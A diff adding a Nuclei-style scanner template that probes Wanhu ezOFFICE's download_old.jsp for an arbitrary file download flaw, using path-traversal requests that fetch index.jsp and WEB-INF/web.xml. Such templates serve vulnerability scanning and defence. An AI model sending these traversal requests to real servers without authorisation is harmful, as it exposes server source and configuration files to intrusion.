@@ -1,0 +1,21 @@
+http:
+    - matchers:
+        - part: header
+          type: word
+          words:
+            - 'Content-Disposition: attachment; filename="x"'
+      method: GET
+      path:
+        - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp'
+        - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
+      redirects: true
+      stop-at-first-match: true
+id: wanhu-ezoffice-download-old-filedownload
+info:
+    author: sm
+    name: 万户ezoffice download_old.jsp 任意文件下载
+    severity: critical
+    tags:
+        - wanhu
+        - filedownload
+        - ezoffice
